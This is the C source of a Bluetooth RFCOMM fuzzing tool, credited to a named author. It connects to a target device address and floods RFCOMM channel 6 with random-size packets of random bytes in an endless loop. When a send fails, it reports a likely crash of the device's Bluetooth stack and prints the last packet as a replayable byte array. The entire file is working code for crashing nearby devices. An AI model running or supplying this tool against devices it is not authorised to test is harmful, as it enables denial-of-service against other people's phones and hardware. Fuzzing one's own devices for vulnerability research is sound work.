/*
 * BLUETOOTH RFCOMM SMASHER
 * This tool intends to perform several tests on the RFCOMM layer 
 * of the bluetooth protocol.
 *
 * GRACE LEE <dil15@uclive.ac.nz>
 * 
 * You may need to install the libbluetooth (-dev) first. 
 * Debian : apt-get install libbluetooth1-dev
 *
 * Copyleft (C) 2016 GRACE LEE
 * 
 * 
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hidp.h>
#include <bluetooth/rfcomm.h>
#include <asm/byteorder.h>

#define MAXSIZE		4096
#define IT		512
#define LENGTH		20
#define	BUFCODE		100

int usage(char *);
void rfcfuzz(char *bdstr_addr, int maxsize, int maxcrash);


void rfcfuzz(char *bdstr_addr, int maxsize, int maxcrash)
{
	char *buf, *savedbuf;
	struct sockaddr_rc addr;
	//struct hidp_conndel_req addr;
	int sock, i, size;
	int crash_count=0, savedsize;
	if ((sock = socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM)) < 0) {
		perror("socket");
		exit(EXIT_FAILURE);
	}

	memset(&addr, 0, sizeof(addr));
	addr.rc_family = AF_BLUETOOTH;
	addr.rc_channel = (uint8_t) 6;

	if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
		perror("bind");
		exit(EXIT_FAILURE);
	}

	str2ba(bdstr_addr, &addr.rc_bdaddr);
	if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		perror("connect");
		exit(EXIT_FAILURE);
	}

	if(!(savedbuf = (char *) malloc ((int) maxsize + 1))) {
		perror("malloc");
		exit(EXIT_FAILURE);
	}

	while(1)		// Initite loop (ctrl-c to stop...)
	{	
		size=rand() % maxsize;
		if(size == 0) 
			size=1;
		if(!(buf = (char *) malloc ((int) size + 1))) {
			perror("malloc");
			exit(EXIT_FAILURE);
		}

		bzero(buf, size);
		for(i=0 ; i<size ; i++)	
			buf[i] = (char) rand();
		
		putchar('.');
		fflush(stdout);
		
		if(send(sock, buf, size, 0) <= 0)
		{
			crash_count++;
			fprintf(stdout, "\n%s BT stack may have crashed. This device seems to be vulnerable to buggy packets.\n", bdstr_addr);
			fprintf(stdout, "Please, ensure that the device has really crashed doing a bt scan for instance.\n");
			fprintf(stdout, "\t----------------------------------------------------\n");
			fprintf(stdout, "\tHost\t\t%s\n", bdstr_addr);
			fprintf(stdout, "\tPacket size\t%d\n", savedsize);
			fprintf(stdout, "\t----------------------------------------------------\n");
			fprintf(stdout, "\tPacket dump\n\t");
			for(i=0 ; i<savedsize ; i++)
			{
				fprintf(stdout, "0x%.2X ", (unsigned char) savedbuf[i]);
				if( (i%30) == 29)
					fprintf(stdout, "\n\t");
			}
			fprintf(stdout, "\n\t----------------------------------------------------\n");

			fprintf(stdout, "char replay_buggy_packet[]=\"");
			for(i=0 ; i<savedsize ; i++)
			{
				fprintf(stdout, "\\x%.2X", (unsigned char) savedbuf[i]);
			}
			fprintf(stdout, "\";\n");

			if((crash_count == maxcrash) && (maxcrash != 0) && (maxcrash >= 0))
			{
				free(buf);
				free(savedbuf);
				exit(EXIT_SUCCESS);
			}
			
		}
		memcpy(savedbuf, buf, size);	// Get the previous packet, not this one...
		savedsize = size;
		free(buf);
	}
}  

int usage(char *name)
{
	fprintf(stderr, "BRS: Bluetooth rfcomm Smasher\n");
	fprintf(stderr, "Usage: %s [-s size] [-m mode] [-p pad_byte] [-M maxcrash_count] <bdaddr>\n", name);	
	exit(EXIT_FAILURE);
}


int main(int argc, char **argv)
{
	int i, siz = 0, maxcrash=1;
	char bdaddr[20], pad=0;

	if(getuid() != 0)
	{
		fprintf(stderr, "You need to be root to launch %s (raw socket)\n", argv[0]);
		exit(EXIT_FAILURE);
	}
	
	if(argc < 2 || argc > 9)
	{
		usage(argv[0]);
	}
	
	for(i = 0; i < argc; i++){
		if(strchr(argv[i], ':'))
			strncpy(bdaddr, argv[i], 18);
		else
		{
		if(!memcmp(argv[i], "-s", 2) && (siz = atoi(argv[++i])) < 0)
			usage(argv[0]);
		
		if(!memcmp(argv[i], "-p", 2) && (pad = (*argv[++i])) < 0)
			usage(argv[0]);
		
		if(!memcmp(argv[i], "-M", 2) && (maxcrash = atoi(argv[++i])) < 0)
			usage(argv[0]);

		}
	}

	rfcfuzz(bdaddr, siz?siz:MAXSIZE, maxcrash);

	fprintf(stdout, "\nYour bluetooth device didn't crash receiving the packets\n");
	
	return EXIT_SUCCESS;
}
